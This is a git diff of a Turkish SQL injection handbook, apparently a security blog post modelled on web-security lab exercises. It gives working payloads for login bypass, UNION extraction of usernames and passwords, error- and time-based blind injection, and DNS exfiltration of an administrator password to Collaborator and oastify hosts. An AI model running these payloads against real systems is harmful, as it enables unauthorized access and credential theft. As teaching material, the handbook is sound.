@@ -1,11 +1,11 @@
 ---
-title: "SQL injection El kitabı"
+title: "SQL Injection El kitabı"
 date: 2025-05-10
-categories: [Siber Güvenlik, HandBook]
-tags: [sql injection, handbook, learn]
+categories: [Siber Güvenlik, Handbook]
+tags: [sql-injection, handbook, learn]
 ---
 
-## SQL injection nedir ? 
+# SQL injection nedir ? 
 Bir uygulamanın database'e erişim sağlayıp veri işlemi yapmak için yazdığı koda bir saldırganın araya girip kendi kodunu yazması, verilere erişebilme ve değiştirme fırsatı tanıyan bir zafiyet türüdür. Bazı durumlarda SQL injection ile server veya back-end'in tehlikeli durumlara yönlendirmesi veyahut ta dos saldırılarına sebep olabilmesidir.
 ## SQL açıkları nasıl tespit edilir ?
 1. Tek tırnak `'` işareti ile bir hata veriyor mu veya bir anormalliğe sebep oluyor mu ?
@@ -14,7 +14,7 @@ Bir uygulamanın database'e erişim sağlayıp veri işlemi yapmak için yazdı�
 4. SQL bekletme sorguları; `WAITFOR DELAY '0:0:10'`
 5. Out-of-band payload ; `SELECT ... INTO OUTFILE '\\\\<oast-domain>\\xyz'`
 
-## SQL 'de çıktı :
+# SQL 'de çıktı :
 Veriler bazen sayısal bazen de sözel  bir değer olarak tutulabilir. SQL sadece sorgu yazmayı değil ayrıca toplama çıkarma gibi işlemleri de destekler. Veritabanı sayısal ve sözel işlemleri şu şekillerde karşılar;
 
 `SELECT 1; =` 1 |  `SELECT 2-1;` = 1 Veritabanı çıkarma, toplama işlemlerini yapar.
@@ -42,7 +42,7 @@ Veriler bazen sayısal bazen de sözel  bir değer olarak tutulabilir. SQL sadec
 
 `SELECT ~1;` 18446744073709551614 = yaklaşık işareti = Max int input
 
-## SQL injection nasıl çalışıyor ?
+# SQL injection nasıl çalışıyor ?
 Bir web sitede https://insecure-website.com/products?category=Gifts url'ine tıkladığımızda bizi hediyeler kategorisinde olan ürün sayfasına yönlendiriyor. Arka planda çalışan sorgu da bu şekilde;
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`   
 sırasıyla SQL kodunu inceleyecek olursak.
@@ -56,7 +56,7 @@ Sorgunun arasına dahil olmaya çalıştığımızda ;
 https://insecure-website.com/products?category=Gifts'+OR+1=1-- ki bunu mantıksal koşul ve yorum satırı kullanarak zafiyetin tespitini yapıyoruz. 
 '1=1 ' e eşit veyahut önceki sorgu doğru ise Gifts ve diğer tüm ürünleri döndür' Eğer 1=2 yapsaydık
 '1=2 ye eşit olmadığında ve önceki sorgu doğru olduğunda sadece Gifts ürünlerini döndür' demek oluyor
-## Farklı kısımlarda SQL injection :
+# Farklı kısımlarda SQL injection :
 Çoğu SQL injection zafiyetinde `WHERE` içinde `SELECT` sorgusuyla gerçekleşir. Genellikle sorgular bir veriyi seçmek, güncellemek, içerisine başka bir veri eklemek için kullanılır. 
 Diğer kısımlar;
 * `WHERE` içinde `UPDATE` sorgusunda
@@ -64,7 +64,7 @@ Diğer kısımlar;
 * `SELECT` sorgusuyla ama tablo ve kolon isimlerini yansıtırken
 * `SELECT` sorgusunu `ORDER BY` ile yaptığında.
 
-## SQLi'de Mantıksal tabanlı hatalar :
+# SQLi'de Mantıksal tabanlı hatalar :
 `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` Sorgusu normalde karşımıza login sayfalarında çıkar. ve bizden kullanıcı adı ve parolamızı girmemiz istenir. Sorgunun sonuna  yorum satırı `--`  yazdığımızda  ;
 SELECT * FROM users WHERE username = 'wiener'-- şeklinde olur. Bu durumda username kontrolü sağlanıyorsa  parola kontrolü atlanır ve giriş yapılırdı.
 Eğer kullanıcı adı daha önceden bir session değişkeninden alınıp sorguya sadece parola parametresi girilseydi, örneğin:
@@ -77,7 +77,7 @@ parola eşleşirse TRUE, eşleşmezse FALSE dönecek şekilde çalışırdı. Bu
 ifadeyi TRUE yapacağı için parola kontrolü de atlanır ve login sayfası başarıyla geçilir.
 
 
-## SQLi'de Veri Aşırma :
+# SQLi'de Veri Aşırma :
 Bu durumda uygulama SQL sorgularının çıktılarını yanıt olarak geri döner. Bir saldırgan SQL injection zafiyetini diğer database tablolarından veri çekmek için kullanabilir. Genelde `UNION` anahtar sözcüğü kullanılır. `SELECT` sözüğü ile istenilen veri kolonu çekilir.
 Örneğin Bir uygulama kullanıcı girdisi `Gifts`  içeren sorguyu çalıştırırsa :
 
@@ -89,28 +89,25 @@ Bir saldırgan şu sorguyu dahil edebilir :
 
 Ardından diğer tabloyu da `Gifts`'in yansıtıldığı yere ekleyebilir.
 
-
-
-
-## Second-order SQL injection :
+# Second-order SQL injection :
 Birinci derece SQL injection uygulamanın işleyişine kullanıcının HTTP requesti ile SQL sorgusuna kendi inputunu birleştirip emniyetsiz bir şekilde çalıştırması idi.
 
 İkinci derece SQL injection Uygulama kullanıcının inputunu HTTP requesti ile alıp sonra ileride kullanmak için saklamasıdır. Bu genelde database'in içerisine input olarak saklanmasıyla olur. Database üzerinde saklanmasında bir zafiyet meydana gelmez. Fakat sonra farklı bir HTTP isteği çalıştırırken uygulama, depolanan verileri alır ve bunu direk SQL sorgusuna katar.  ikinci seviye SQL inejction Ayrıca Stored SQL injection olarak bilinir. 
 
 Geliştiriciler SQL injection'a karşı ilk veri girişinde önlem alsa da, veritabanına güvenli şekilde kaydedilen veri daha sonra güvensiz biçimde işlendiğinde, ikinci aşamada SQL injection gerçekleşebilir.
 
-### Database Farklılıkları :
+## Database Farklılıkları :
 * Dize birleştirme için sözdizimi
 * Yorum satırı
 * Toplu veya istifli sorgular
 * Belirli API'nin Platformları
 * Hata mesajları
 
-## SQL injection UNION saldırıları:
+# SQL injection UNION saldırıları:
 
 Bir uygulama SQL Injection (SQLi) zafiyetine sahipse ve sorgu sonuçları uygulamanın yanıtlarında görüntüleniyorsa, **UNION** anahtar kelimesi kullanılarak veritabanındaki diğer tablolardan veri elde edilebilir. Bu tür saldırılar genellikle **SQL Injection UNION saldırısı** olarak adlandırılır.
 
-### UNION Anahtar Kelimesi Nedir?
+## UNION Anahtar Kelimesi Nedir?
 
 **UNION** anahtar kelimesi, bir veya daha fazla ek SELECT sorgusunun çalıştırılmasına ve sonuçlarının orijinal sorgunun sonuçlarına eklenmesine olanak tanır. Örneğin:
 
@@ -134,7 +131,7 @@ Bir UNION sorgusunun başarılı olabilmesi için iki temel şart yerine getiril
 2. **Her bir sütundaki veri türleri uyumlu olmalıdır.**
 
 
-## SQL Injection UNION Saldırısı Nasıl Yapılır?
+# SQL Injection UNION Saldırısı Nasıl Yapılır?
 
 Bir SQL Injection UNION saldırısı gerçekleştirmek için, saldırının yukarıdaki iki gereksinimi karşıladığından emin olmanız gerekir. Bu genellikle şu bilgilerin elde edilmesini içerir:
 
@@ -145,10 +142,10 @@ Bir SQL Injection UNION saldırısı gerçekleştirmek için, saldırının yuka
 
 Bu bilgileri topladıktan sonra, uygun biçimde yapılandırılmış UNION sorguları ile veritabanındaki hassas verilere erişmek mümkün olabilir.
 
-### Sütun Sayısını Belirleme (Column Count)
+## Sütun Sayısını Belirleme (Column Count)
 
 **SQL Injection UNION saldırısı** yaparken, orijinal sorgunun kaç sütun döndürdüğünü anlamak için iki temel yöntem kullanılır:
-#### 1. `ORDER BY` Yöntemi
+### 1. `ORDER BY` Yöntemi
 
 Sorguya artan indekslerle `ORDER BY` eklenir:
 
@@ -161,7 +158,7 @@ Bir hata alınana kadar bu şekilde devam edilir. Hata alındığında, belirtil
 
 Sorgu içinde bulunduğu tablonun kolon sayısına göre şekillenir. Kaç adet Kolonu var ise ona göre yazılabilir. Örnek olarak Sorguyu körlemesine denemek yerinenormal çalıştırıp kaç farklı bilgi verdiğine ve gözükmeyen id gibi bilgileri de hesaba katarak kolon sayısını tahmin edebiliriz.
 
-#### 2. `UNION SELECT NULL` Yöntemi
+### 2. `UNION SELECT NULL` Yöntemi
 
 * `UNION` kullanıldığında veritabanı iki SELECT ifadesinin aynı sayıda ve aynı türde sütun döndürmesini ister.
 *  `UNION` sorgusunda iki sorguyu birleştirdiğinden hata çıkmaması için ikisininde aynı kolon sayısına sahip olması lazımdır. Çalışma biçimi yüzünden bizi böyle bir zorunluluğa iter. 
@@ -177,7 +174,7 @@ Doğru sütun sayısı yakalandığında, hata alınmaz ve bazı durumlarda yan�
 
 Her bir NULL değeri Kolon'u temsil eder ve kolon hangi veri tipiyse onunla uyum sağlamak zorundadır. İnteger ise '200' gibi sayı, String ise 'test' gibi yazı girilmesi lazımdır. Sorguya Dahil olup istediğimiz bilgileri yazdırması için string bir alana ihtiyacımız vardır. 
 
-#### 3. SQL injection da Veri çekmek için kullanılan genel SQL Sorguları :
+### 3. SQL injection da Veri çekmek için kullanılan genel SQL Sorguları :
 Eğer baştan başlayıp tüm veritabanı isimleri isimlerini öğrenmek istiyor isek.  :
 
 ```Postgresql
@@ -205,11 +202,11 @@ Tablodan kolonlara ulaşmak için :
 ```
 
 
-### 4. Tek Bir Sütunda Birden Fazla Değer Çekme
+## 4. Tek Bir Sütunda Birden Fazla Değer Çekme
 
 Bazı durumlarda, enjeksiyon yaptığınız sorgu yalnızca **tek bir sütun** döndürebilir. Bu durumda birden fazla alanı aynı anda görebilmek için bu değerleri **birleştirerek** tek sütunda sunabilirsiniz. Bunu yaparken aralarına bir **ayraç** koymak, hangi değerin nerede bittiğini anlamanızı kolaylaştırır.
 
-### Nasıl Yapılır?
+## Nasıl Yapılır?
 
 - **String Birleştirme Operatörü** kullanın.
     - PostgreSql’ de bu operatör: `|| '~' || `
@@ -224,7 +221,7 @@ Sonuçta her satırda şu formatta veri göreceksiniz: `kullanıcıadı~şifre`
 
 
 
-## Blind SQL injection
+# Blind SQL injection
 
 **Blind SQL Injection**, uygulamanın SQL enjeksiyonuna açık olmasına rağmen sorgu sonuçlarını ya da hata mesajlarını doğrudan geri dönmediği durumlardır. Bu tip zafiyetlerde standart UNION saldırıları etkisizdir, zira ek sorgunun çıktısını göremezsiniz. Yine de, uygulamanın davranış farklılıklarını kullanarak veri çekmek mümkündür.
 
@@ -233,7 +230,7 @@ Blind SQLi Güvenlik açıklıklarından yararlanmak için aşağıdaki yönteml
 * Zamana bağlı olarak tetiklenen bir sorgu yazabilirsiniz. Bu koşulun doğru olması durumunda Database'i bir süre gecikmeli bir şekilde çalıştırır.
 * Bazen ise OAST teknikleri ile out-of-band network interaction (Bant dışı ağ etkileşimi) tetikleyebilirsiniz. Bu teknik oldukça güçlüdür. Diğer tekniklerin çalışmadığı zamanda iş görür. 
 
-### Koşullu Yanıtlarla Veri Çekme
+## Koşullu Yanıtlarla Veri Çekme
 
 Uygulama, mesela bir `TrackingId` çerezi ile kullanıcıyı tanıyorsa “Welcome back” mesajı döndürüyor, aksi halde bu mesaj gelmiyorsa:
 
@@ -289,7 +286,7 @@ AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1
 
 
 
-## Error-Based SQL Injection
+# Error-Based SQL Injection
 
 **Hata Tabanlı SQL Injection**, uygulamanın döndürdüğü **hata mesajları** üzerinden veri sızdırma veya çıkarma teknikleridir. İki temel senaryo vardır:
 
@@ -404,7 +401,7 @@ AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)-- Sorgu
 ERROR: invalid input syntax for type integer: "h66sntiqeof8m946yma1"
 ```
 
-##### **İkinci kısım: Hata tabanlı SQLi ye yönelik sorular ?  :**
+#### **İkinci kısım: Hata tabanlı SQLi ye yönelik sorular ?  :**
 **Soru - 1) CAST işlevi farklı şekillerde kullanılabilir mi ?**
 		Sorguyu daha da kısaltmanın bir yolu vardır. Normal sorgunun CAST alanını çıkararak ve sonuna ::int(dönüştürülmek istenen değer) yazarak gerçekleşir sorguda şöyle gözükür:
 		`AND 1=(SELECT password FROM users LIMIT 1)::int`
@@ -421,7 +418,7 @@ ERROR: invalid input syntax for type integer: "h66sntiqeof8m946yma1"
 		`'AND (SELECT '<script>alert(2)</script>'::int)--`
 
 
-## Time‑Based Blind SQL Injection:
+# Time‑Based Blind SQL Injection:
 Uygulama, SQL hatalarını yakalayıp kullanıcıya hiçbir fark göstermiyorsa (örneğin tüm hataları “bir sorun oluştu” sayfasına yönlendiriyorsa), error‑based yöntemler etkisiz kalır. Bu durumda, sorgu şartına bağlı olarak **zamansal gecikme** (delay) tetikleyerek true/false’i ölçeriz.
 
 SQL sorgusunu bozmadan, içine koşula bağlı bir `WAITFOR DELAY` (MSSQL) veya `pg_sleep` (PostgreSQL) gibi bir komut yerleştiririz. Koşul doğruysa bekleme süresi çalışır ve HTTP yanıtı gecikir; yanlışsa hemen yanıt döner. Yanıt süresi sayesinde “koşul doğru mu?” sorusuna yanıt buluruz. Örnek :
@@ -449,8 +446,7 @@ Hata - `ERROR: argument of OR must be type boolean, not type void`
 Hata vermek yerine pg_sleep() çalıştıran sorgu:
 `'OFFSET (SELECT COUNT(*) FROM pg_sleep(5))'`
 
-
-## Blind SQLi, Out of Band (OAST) :
+# Blind SQLi, Out of Band (OAST) :
 Bazı web uygulamaları, SQL sorgularını kullanıcı isteğinden sonra senkron bir şekilde değil, arka planda farklı bir iş parçacığı (thread) kullanarak çalıştırır. Bu durumda, uygulama kullanıcının isteğine normal şekilde yanıt verirken, SQL sorgusu arka planda yürütülür. Sorgu SQL Injection'a karşı savunmasız olabilir; fakat:
 - Sorgudan veri dönmesi beklenmediği,
 - Hata mesajı oluşturmadığı,
@@ -458,7 +454,7 @@ Bazı web uygulamaları, SQL sorgularını kullanıcı isteğinden sonra senkron
 **klasik blind SQL injection teknikleri etkili olmaz.**
 Bu gibi durumlarda, **"Out-of-Band (OAST)" teknikleri** kullanılarak saldırı gerçekleştirilebilir. Bu yaklaşımda, saldırganın kontrolündeki bir sunucuya yönlendirilen dış ağ istekleri tetiklenir. SQL sorgusu içine enjekte edilen payload'lar, bu dış istekleri (genellikle DNS veya HTTP) oluşturur. Uygulama tarafından başlatılan bu istekler saldırgan tarafından kaydedilerek sistemin zafiyet içerip içermediği ve hangi verilerin sızdırıldığı analiz edilebilir.
 
-#### Neden DNS?
+### Neden DNS?
 OAST tekniklerinde en yaygın kullanılan protokol **DNS**'tir. Çünkü:
 - DNS istekleri, çoğu ağda çıkış yönünde serbest bırakılmıştır.
 - Uygulamanın veya veritabanının DNS çözümlemesi yapmasına engel olan güvenlik duvarı nadiren bulunur.
@@ -472,7 +468,7 @@ Microsoft SQL Server üzerinde aşağıdaki payload, dışa DNS isteği gönderi
 ```
 Bu komut, veritabanını şu DNS adresine sorgu göndermeye zorlar: `örnek.burpcollaborator.net`
 
-### Out-of-Band Kanal Üzerinden Veri Sızdırma
+## Out-of-Band Kanal Üzerinden Veri Sızdırma
 Blind SQL Injection zafiyetinin varlığı ve dışa DNS isteği tetiklenebildiği doğrulandıktan sonra, artık bu **OAST** kanalı üzerinden doğrudan veri sızdırmak mümkündür.
 
 Bu teknikle, hassas bir veritabanı bilgisini DNS isteğine gömerek saldırganın kontrolündeki sunucuya göndermek mümkündür. Örnek:
@@ -503,9 +499,6 @@ exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborat
 	- DNS isteği sırasında `@p` içine büyük veri koyarsan, **istek başarısız olabilir** ya da **veri parçalanır.**
 	- Ayrıca, DNS çözümleme sırasında bazı karakterler (örneğin boşluk, özel karakterler) geçersizdir ve veri bozulabilir.
 
-
-
-
 **POSTGRESQL :**
 
 PostgreSQL'de tablolar genellikle `public` adlı bir **şema (schema)** altında yer alır. Yani:
@@ -524,7 +517,7 @@ SELECT schema_name FROM information_schema.schemata;
 ```
 
 
-##### POSTGRESQL NULL propagasyonu :
+#### POSTGRESQL NULL propagasyonu :
 
 eğer birleştirmeye çalıştığın herhangi bir parça `NULL` ise, bütün sonuç `NULL` olur.
 
@@ -540,10 +533,6 @@ UNION SELECT NULL, username || '~' || password || '~' || COALESCE(email, '') FRO
 ```
 
 
-
-
-
-
 **MySQL :**
 
 ```MySql
@@ -554,9 +543,6 @@ SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
 ```
 
 
-
-
-
 **Microsoft SQL Server (MSSQL)** :
 
 ```sql
@@ -565,9 +551,6 @@ SELECT name FROM sys.databases;
 -- Geçerli veritabanındaki tüm şemalar
 SELECT name AS schema_name FROM sys.schemas;
 ```
-
-
-
 
 **Oracle :**
  Temel Sorgular
@@ -583,7 +566,6 @@ Oracle da her bir `SELECT` sorgusu `FROM` kelimesi ile belirli bir tabloyla kull
 UNION SELECT NULL FROM DUAL--
 ```
 
-
 **OAST TEKNİKLERİ :**
 Veritabanı DNS ile etkileşim kurabiliyor mu diye öğrenmek için :
 ```sql
@@ -594,42 +576,7 @@ OUT of band sorgularını daha optimize edebilmek için.
  '|| UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator') || '.cdt2afnakmekb3yikb8mea9yup0go9cy.oastify.com') ||'
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#### Önemli yerler : 
+# Önemli yerler : 
 Çoğunlukla kullanılan Database sistemleri :
 - MySQL
 - MariaDB
